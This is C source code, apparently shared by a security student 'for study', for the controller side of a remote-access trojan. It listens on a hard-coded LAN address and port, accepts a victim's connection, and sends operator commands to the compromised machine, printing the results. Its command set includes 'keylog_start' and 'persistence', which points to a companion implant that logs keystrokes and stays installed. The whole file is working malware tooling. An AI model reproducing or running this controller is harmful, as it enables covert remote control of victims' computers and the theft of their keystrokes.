/*
 * Criado por Jean(Kripto-Sec) estudante de segurança da informação
 * Criado apenas para fins educativos não use pra beneficio proprio
 * Apenas para estudo
 * github: https://github.com/Kripto-Sec
 * bom estudo
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main()
{
	int sock, client_socket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_address, client_address;
	int i = 0;
	int optval = 1;
	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
		printf("Erro em setar configuracoes do TCP!");
		return 1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("192.168.0.105");
	server_address.sin_port = htons(50005);

	bind(sock, (struct sockaddr*)&server_address, sizeof(server_address));
	listen(sock, 5);

	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr*)&client_address, &client_length);

	while (1) { //e aqui que vai fazer os comandos
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");
		write(client_socket, buffer, sizeof(buffer));

		if (strncmp("q", buffer, 1) == 0)
			break;

		//comando para mudar de diretorio tem que add um espaco
		else if (strncmp("cd ", buffer, 3) == 0)
			continue;

		else if (strncmp("keylog_start", buffer, 12) == 0)
			continue;

		else if (strncmp("persistence", buffer, 11) == 0) {
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}

		else {
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}
	}

	return 0;
}
